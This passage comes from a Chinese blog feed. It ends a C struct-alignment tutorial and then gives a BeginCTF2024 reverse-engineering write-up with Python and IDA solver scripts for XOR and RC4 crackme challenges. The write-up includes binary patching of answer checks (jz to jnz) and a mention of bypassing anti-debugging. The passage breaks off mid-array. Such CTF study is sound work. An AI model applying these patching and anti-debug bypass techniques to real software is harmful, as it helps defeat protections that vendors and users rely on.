class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 结构体字节对齐的几个例子</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">A</span> &#123;</span></span><br><span class="line">        <span class="type">char</span> a;</span><br><span class="line">        <span class="type">char</span> b;</span><br><span class="line">    &#125;; <span class="comment">// 均占1字节,对齐为1字节---共2字节</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">B</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> a;</span><br><span class="line">        <span class="type">char</span> b;</span><br><span class="line">    &#125;; <span class="comment">// a占4字节,对齐为4字节, b占1字节,对齐为1字节---末尾填充3字节,共8字节</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">C</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> *a;</span><br><span class="line">        <span class="type">char</span> b;</span><br><span class="line">    &#125;; <span class="comment">// a占8字节,对齐为8字节, b占1字节,对齐为1字节---末尾填充7字节,共16字节</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sizeof(A) = %d\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> A));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sizeof(B) = %d\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> B));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sizeof(C) = %d\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> C));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240209233118305.png" alt="image-20240209233118305" style="zoom:50%;" /><p>实际上各结构体分布如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">结构体A:</span><br><span class="line">|<span class="type">char</span>|<span class="type">char</span>|  <span class="number">2</span>字节</span><br><span class="line">结构体B:</span><br><span class="line">|--------<span class="type">int</span>--------|  <span class="number">4</span>字节</span><br><span class="line">|<span class="type">char</span>|----|----|----|  <span class="number">4</span>字节</span><br><span class="line">结构体C:</span><br><span class="line">|---------------<span class="type">int</span>*---------------|  <span class="number">8</span>字节</span><br><span class="line">|--<span class="type">short</span>--|----|----|----|----|----|  <span class="number">8</span>字节</span><br></pre></td></tr></table></figure><p>其他大多数情况均类似这样.</p><p>有时候为了提高效率/空间利用率,需要对各个成员的顺序进行调整.但是如果这个结构体比较庞大的话,打乱顺序势必会导致可读性下降,有时候宁愿效率低点,也要保证可读性,二者之间要进行一个权衡.</p><br><p>本章内容不多,讲解了结构体与指针的一些内容,一定要彻底理解,后续实现各种数据结构有着重要应用!</p><p align=right>——WAHAHA 2024.2.9(跨年23:50)</p><p align=right>新年快乐~~~</p><br><br><p>上一篇:<a href="../20247276fcdb268f">C语言教程-14_1-初识结构体</a></p><p>下一篇:<a href="../202423c9a8f7f871/">C语言教程-14_3-使用位域进行位操作</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Writeup-BeginCTF2024</title>
      <link href="/202447760fa9a74d/"/>
      <url>/202447760fa9a74d/</url>
      
        <content type="html"><![CDATA[<h1 id="reverse">Reverse</h1><h2 id="xor">xor</h2><p>一系列的异或,找对密钥和异或顺序即可.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">enc_flag = <span class="string">&quot;`agh&#123;^bvuwTooahlYocPtmyiijj|ek&#x27;p&quot;</span></span><br><span class="line">enc_flag_list = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> enc_flag]</span><br><span class="line">wtf1_ogn = <span class="built_in">list</span>(<span class="string">&#x27;63290794207715587679621386735000&#x27;</span>)</span><br><span class="line">wtf2_ogn = <span class="built_in">list</span>(<span class="string">&#x27;41803873625901363092606632787947&#x27;</span>)</span><br><span class="line">wtf1_ogn_ord = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> wtf1_ogn]</span><br><span class="line">wtf2_ogn_ord = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> wtf2_ogn]</span><br><span class="line"></span><br><span class="line">wtf1_byte_1 = wtf1_ogn_ord[:<span class="number">16</span>]</span><br><span class="line">wtf1_byte_2 = wtf1_ogn_ord[<span class="number">16</span>:]</span><br><span class="line">wtf2_byte_1 = wtf2_ogn_ord[:<span class="number">16</span>]</span><br><span class="line">wtf2_byte_2 = wtf2_ogn_ord[<span class="number">16</span>:]</span><br><span class="line"><span class="comment"># 末尾还要补上一个0</span></span><br><span class="line">wtf1_byte_1.append(<span class="number">0</span>)</span><br><span class="line">wtf1_byte_2.append(<span class="number">0</span>)</span><br><span class="line">wtf2_byte_1.append(<span class="number">0</span>)</span><br><span class="line">wtf2_byte_2.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># reverse enc2</span></span><br><span class="line">copy2_xored_flag = enc_flag_list[:]</span><br><span class="line">copy_xored_flag_1 = copy2_xored_flag[<span class="number">16</span>:]</span><br><span class="line">copy_xored_flag_2 = copy2_xored_flag[:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    copy_xored_flag_2[i] ^= wtf2_byte_2[<span class="number">16</span> - i]</span><br><span class="line">    copy_xored_flag_1[i] ^= wtf2_byte_1[<span class="number">16</span> - i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    copy_xored_flag_2[i] ^= wtf2_byte_1[<span class="number">16</span> - i]</span><br><span class="line">    copy_xored_flag_1[i] ^= wtf2_byte_2[<span class="number">16</span> - i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    copy_xored_flag_2[i] ^= wtf2_byte_2[i]</span><br><span class="line">    copy_xored_flag_1[i] ^= wtf2_byte_1[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    copy_xored_flag_2[i] ^= wtf2_byte_1[i]</span><br><span class="line">    copy_xored_flag_1[i] ^= wtf2_byte_2[i]</span><br><span class="line"></span><br><span class="line">xored_input_flag = [<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    xored_input_flag[i + <span class="number">16</span>] = copy_xored_flag_2[i]</span><br><span class="line">    xored_input_flag[i] = copy_xored_flag_1[i]</span><br><span class="line"></span><br><span class="line"><span class="comment"># reverse enc1</span></span><br><span class="line">copy_input_flag_1 = xored_input_flag[<span class="number">16</span>:]</span><br><span class="line">copy_input_flag_2 = xored_input_flag[:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    copy_input_flag_2[i] ^= wtf1_byte_2[<span class="number">16</span> - i]</span><br><span class="line">    copy_input_flag_1[i] ^= wtf1_byte_1[<span class="number">16</span> - i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    copy_input_flag_2[i] ^= wtf1_byte_1[<span class="number">16</span> - i]</span><br><span class="line">    copy_input_flag_1[i] ^= wtf1_byte_2[<span class="number">16</span> - i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    copy_input_flag_2[i] ^= wtf1_byte_2[i]</span><br><span class="line">    copy_input_flag_1[i] ^= wtf1_byte_1[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    copy_input_flag_2[i] ^= wtf1_byte_1[i]</span><br><span class="line">    copy_input_flag_1[i] ^= wtf1_byte_2[i]</span><br><span class="line"></span><br><span class="line">input_flag = [<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    input_flag[i + <span class="number">16</span>] = copy_input_flag_2[i]</span><br><span class="line">    input_flag[i] = copy_input_flag_1[i]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> input_flag])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240207103355686.png" alt="image-20240207103355686" style="zoom:50%;" /><h2 id="supergusser">SuperGusser</h2><p>本题后来发现用了xObf混淆器进行混淆:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240207104914098.png" alt="image-20240207104914098" style="zoom:50%;" /><p>动调的话,一步步执行会恢复一部分函数,不过我当时主要还是看汇编动调(累死).</p><p>加密循环在loc_40167F处:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040167F loc_40167F:                             ; CODE XREF: sub_401530+18F↓j</span><br><span class="line">.text:000000000040167F mov     rdx, [rbp-30h]</span><br><span class="line">.text:0000000000401683 mov     eax, [rbp-14h]</span><br><span class="line">.text:0000000000401686 cdqe</span><br><span class="line">.text:0000000000401688 movzx   ecx, byte ptr [rdx+rax]</span><br><span class="line">.text:000000000040168C mov     eax, [rbp-14h]</span><br><span class="line">.text:000000000040168F mov     edx, eax</span><br><span class="line">.text:0000000000401691 movzx   eax, byte ptr [rbp-19h]</span><br><span class="line">.text:0000000000401695 lea     r8d, [rdx+rax]</span><br><span class="line">.text:0000000000401699 movzx   edx, byte ptr [rbp-1Ah]</span><br><span class="line">.text:000000000040169D mov     eax, edx</span><br><span class="line">.text:000000000040169F shl     eax, 4</span><br><span class="line">.text:00000000004016A2 add     eax, edx</span><br><span class="line">.text:00000000004016A4 add     eax, r8d</span><br><span class="line">.text:00000000004016A7 xor     ecx, eax</span><br><span class="line">.text:00000000004016A9 mov     rdx, [rbp-30h]</span><br><span class="line">.text:00000000004016AD mov     eax, [rbp-14h]</span><br><span class="line">.text:00000000004016B0 cdqe</span><br><span class="line">.text:00000000004016B2 mov     [rdx+rax], cl</span><br><span class="line">.text:00000000004016B5 add     dword ptr [rbp-14h], 1</span><br><span class="line">.text:00000000004016B9</span><br><span class="line">.text:00000000004016B9 loc_4016B9:                             ; CODE XREF: sub_401530+14D↑j</span><br><span class="line">.text:00000000004016B9 mov     eax, [rbp-14h]</span><br><span class="line">.text:00000000004016BC cmp     eax, [rbp-18h]</span><br><span class="line">.text:00000000004016BF jl      short loc_40167F</span><br></pre></td></tr></table></figure><p>加密后在后面紧跟的0x4016D5处调用了loc_46EEF4,该函数内调用了memcmp()来进行比较.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240207104020663.png" alt="image-20240207104020663" style="zoom:50%;" /><p>F7进入后可以看到jmp到memcmp():</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240207104127323.png" alt="image-20240207104127323" style="zoom:50%;" /><p>当时想着总之最后就是把数据提取出来,反着解密一遍就好了,没有其他的东西.</p><p>复盘写WP时看加密过程以为异或的是<code>0x44</code>,但是当时用x64dbg调试发现实际上异或的是<code>0x33</code>(幸好当时用x64dbg了).</p><p>这里实际上有反调试,我的x64dbg装了<code>SharpOD</code>反反调试插件所以不受影响,如果使用IDA动调的话,且没有发现<code>kernel32_IsDebuggerPresent</code>的话就会出错.</p><p>数据也很好提取,然后异或就好:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># 加密循环位于0x40167F</span></span><br><span class="line"><span class="string"># memcpy检查在该处指令:0x4016D5 call    loc_46EEF4</span></span><br><span class="line"><span class="string"># IDA加密数据提取:</span></span><br><span class="line"><span class="string">adr = 0x67fda0</span></span><br><span class="line"><span class="string">li = []</span></span><br><span class="line"><span class="string">for i in range(0x26):</span></span><br><span class="line"><span class="string">    tmp = idc.get_wide_byte(adr+i)</span></span><br><span class="line"><span class="string">    li.append(tmp)</span></span><br><span class="line"><span class="string">print(li)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">enc = [</span><br><span class="line">    <span class="number">81</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">95</span>, <span class="number">89</span>, <span class="number">67</span>, <span class="number">93</span>, <span class="number">95</span>, <span class="number">89</span>, <span class="number">73</span>, <span class="number">90</span>, <span class="number">89</span>, <span class="number">86</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">29</span>, <span class="number">42</span>, <span class="number">55</span>, <span class="number">26</span>, <span class="number">39</span>, <span class="number">41</span>, <span class="number">23</span>, <span class="number">40</span>, <span class="number">36</span>, <span class="number">42</span>, <span class="number">56</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">61</span>,</span><br><span class="line">    <span class="number">15</span>, <span class="number">50</span>, <span class="number">58</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">54</span>, <span class="number">51</span>, <span class="number">42</span>, <span class="number">0</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x25</span>):</span><br><span class="line">    <span class="comment"># enc[i] = flag[i] ^ (0x33 + i)</span></span><br><span class="line">    enc[i] ^= (<span class="number">0x33</span> + i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240207104800338.png" alt="image-20240207104800338" style="zoom:50%;" /><h2 id="俄语学习">俄语学习</h2><p>将所有俄语问题的答案检查(jz)全部patch成jnz:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">start_addr = <span class="number">0x10022b0</span></span><br><span class="line">end_addr = <span class="number">0x1002d7f</span></span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x74</span>,<span class="number">0x1e</span>,<span class="number">0x68</span>]</span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i in range(start_addr,end_addr):</span><br><span class="line">    temp=[<span class="number">0</span>]*<span class="number">3</span></span><br><span class="line">    <span class="keyword">for</span> j in range(<span class="number">3</span>):</span><br><span class="line">        temp[j] = idc.get_wide_byte(i+j)</span><br><span class="line">    <span class="keyword">for</span> j in range(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">if</span> temp[j] != key[j]:</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    ida_bytes.patch_byte(i,<span class="number">0x75</span>)</span><br><span class="line">    print(<span class="string">&#x27;patched &#x27;</span>+str(i))</span><br><span class="line">print(<span class="string">&#x27;done&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后动调分析就可以得到后面的数据.</p><p>分析可以得知后面是一个标准的RC4:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">sbox1 = [</span><br><span class="line">    <span class="number">53</span>, <span class="number">241</span>, <span class="number">218</span>, <span class="number">25</span>, <span class="number">122</span>, <span class="number">246</span>, <span class="number">49</span>, <span class="number">156</span>, <span class="number">217</span>, <span class="number">44</span>,</span><br><span class="line">    <span class="number">193</span>, <span class="number">252</span>, <span class="number">226</span>, <span class="number">216</span>, <span class="number">29</span>, <span class="number">141</span>, <span class="number">79</span>, <span class="number">151</span>, <span class="number">129</span>, <span class="number">38</span>,</span><br><span class="line">    <span class="number">192</span>, <span class="number">184</span>, <span class="number">150</span>, <span class="number">39</span>, <span class="number">213</span>, <span class="number">91</span>, <span class="number">170</span>, <span class="number">24</span>, <span class="number">133</span>, <span class="number">250</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">228</span>, <span class="number">161</span>, <span class="number">188</span>, <span class="number">248</span>, <span class="number">164</span>, <span class="number">86</span>, <span class="number">55</span>, <span class="number">67</span>, <span class="number">88</span>,</span><br><span class="line">    <span class="number">43</span>, <span class="number">201</span>, <span class="number">119</span>, <span class="number">100</span>, <span class="number">204</span>, <span class="number">107</span>, <span class="number">152</span>, <span class="number">101</span>, <span class="number">117</span>, <span class="number">56</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">61</span>, <span class="number">208</span>, <span class="number">230</span>, <span class="number">143</span>, <span class="number">169</span>, <span class="number">87</span>, <span class="number">153</span>,</span><br><span class="line">    <span class="number">6</span>, <span class="number">16</span>, <span class="number">93</span>, <span class="number">197</span>, <span class="number">105</span>, <span class="number">189</span>, <span class="number">45</span>, <span class="number">104</span>, <span class="number">126</span>, <span class="number">227</span>,</span><br><span class="line">    <span class="number">103</span>, <span class="number">209</span>, <span class="number">255</span>, <span class="number">94</span>, <span class="number">249</span>, <span class="number">245</span>, <span class="number">65</span>, <span class="number">140</span>, <span class="number">221</span>, <span class="number">33</span>,</span><br><span class="line">    <span class="number">75</span>, <span class="number">167</span>, <span class="number">71</span>, <span class="number">134</span>, <span class="number">109</span>, <span class="number">195</span>, <span class="number">42</span>, <span class="number">154</span>, <span class="number">159</span>, <span class="number">32</span>,</span><br><span class="line">    <span class="number">72</span>, <span class="number">187</span>, <span class="number">148</span>, <span class="number">185</span>, <span class="number">180</span>, <span class="number">146</span>, <span class="number">2</span>, <span class="number">116</span>, <span class="number">125</span>, <span class="number">27</span>,</span><br><span class="line">    <span class="number">30</span>, <span class="number">95</span>, <span class="number">186</span>, <span class="number">73</span>, <span class="number">214</span>, <span class="number">231</span>, <span class="number">83</span>, <span class="number">4</span>, <span class="number">203</span>, <span class="number">40</span>,</span><br><span class="line">    <span class="number">63</span>, <span class="number">232</span>, <span class="number">51</span>, <span class="number">62</span>, <span class="number">0</span>, <span class="number">155</span>, <span class="number">106</span>, <span class="number">253</span>, <span class="number">190</span>, <span class="number">28</span>,</span><br><span class="line">    <span class="number">144</span>, <span class="number">237</span>, <span class="number">223</span>, <span class="number">77</span>, <span class="number">37</span>, <span class="number">111</span>, <span class="number">181</span>, <span class="number">19</span>, <span class="number">112</span>, <span class="number">60</span>,</span><br><span class="line">    <span class="number">158</span>, <span class="number">22</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">74</span>, <span class="number">115</span>, <span class="number">222</span>, <span class="number">177</span>, <span class="number">138</span>, <span class="number">81</span>,</span><br><span class="line">    <span class="number">59</span>, <span class="number">84</span>, <span class="number">20</span>, <span class="number">224</span>, <span class="number">90</span>, <span class="number">220</span>, <span class="number">145</span>, <span class="number">98</span>, <span class="number">163</span>, <span class="number">149</span>,</span><br><span class="line">    <span class="number">211</span>, <span class="number">58</span>, <span class="number">23</span>, <span class="number">238</span>, <span class="number">50</span>, <span class="number">242</span>, <span class="number">124</span>, <span class="number">175</span>, <span class="number">179</span>, <span class="number">136</span>,</span><br><span class="line">    <span class="number">236</span>, <span class="number">14</span>, <span class="number">174</span>, <span class="number">157</span>, <span class="number">92</span>, <span class="number">13</span>, <span class="number">85</span>, <span class="number">78</span>, <span class="number">251</span>, <span class="number">70</span>,</span><br><span class="line">    <span class="number">34</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">191</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">102</span>, <span class="number">7</span>, <span class="number">210</span>, <span class="number">54</span>,</span><br><span class="line">    <span class="number">147</span>, <span class="number">110</span>, <span class="number">66</span>, <span class="number">26</span>, <span class="number">15</span>, <span class="number">233</span>, <span class="number">96</span>, <span class="number">202</span>, <span class="number">178</span>, <span class="number">108</span>,</span><br><span class="line">    <span class="number">131</span>, <span class="number">240</span>, <span class="number">3</span>, <span class="number">118</span>, <span class="number">168</span>, <span class="number">31</span>, <span class="number">99</span>, <span class="number">239</span>, <span class="number">165</span>, <span class="number">205</span>,</span><br><span class="line">    <span class="number">121</span>, <span class="number">123</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">171</span>, <span class="number">219</span>, <span class="number">212</span>, <span class="number">127</span>, <span class="number">1</span>, <span class="number">52</span>,</span><br><span class="line">    <span class="number">35</span>, <span class="number">89</span>, <span class="number">225</span>, <span class="number">41</span>, <span class="number">198</span>, <span class="number">172</span>, <span class="number">162</span>, <span class="number">64</span>, <span class="number">200</span>, <span class="number">173</span>,</span><br><span class="line">    <span class="number">196</span>, <span class="number">137</span>, <span class="number">194</span>, <span class="number">182</span>, <span class="number">113</span>, <span class="number">160</span>, <span class="number">235</span>, <span class="number">47</span>, <span class="number">120</span>, <span class="number">243</span>,</span><br><span class="line">    <span class="number">176</span>, <span class="number">254</span>, <span class="number">206</span>, <span class="number">247</span>, <span class="number">132</span>, <span class="number">114</span>, <span class="number">244</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">215</span>,</span><br><span class="line">    <span class="number">183</span>, <span class="number">142</span>, <span class="number">76</span>, <span class="number">130</span>, <span class="number">48</span>, <span class="number">80</span>, <span class="number">46</span>, <span class="number">36</span>, <span class="number">135</span>, <span class="number">8</span>,</span><br><span class="line">    <span class="number">57</span>, <span class="number">229</span>, <span class="number">234</span>, <span class="number">166</span>, <span class="number">139</span>, <span class="number">21</span></span><br><span class="line">]</span><br><span class="line">sbox2 = [</span><br><span class="line">    <span class="number">53</span>, <span class="number">241</span>, <span class="number">218</span>, <span class="number">25</span>, <span class="number">122</span>, <span class="number">246</span>, <span class="number">49</span>, <span class="number">156</span>, <span class="number">217</span>, <span class="number">44</span>,</span><br><span class="line">    <span class="number">193</span>, <span class="number">252</span>, <span class="number">226</span>, <span class="number">216</span>, <span class="number">29</span>, <span class="number">141</span>, <span class="number">79</span>, <span class="number">151</span>, <span class="number">129</span>, <span class="number">38</span>,</span><br><span class="line">    <span class="number">192</span>, <span class="number">184</span>, <span class="number">150</span>, <span class="number">39</span>, <span class="number">213</span>, <span class="number">91</span>, <span class="number">170</span>, <span class="number">24</span>, <span class="number">133</span>, <span class="number">250</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">228</span>, <span class="number">161</span>, <span class="number">188</span>, <span class="number">248</span>, <span class="number">164</span>, <span class="number">86</span>, <span class="number">55</span>, <span class="number">67</span>, <span class="number">88</span>,</span><br><span class="line">    <span class="number">43</span>, <span class="number">201</span>, <span class="number">119</span>, <span class="number">100</span>, <span class="number">204</span>, <span class="number">107</span>, <span class="number">152</span>, <span class="number">101</span>, <span class="number">117</span>, <span class="number">56</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">61</span>, <span class="number">208</span>, <span class="number">230</span>, <span class="number">143</span>, <span class="number">169</span>, <span class="number">87</span>, <span 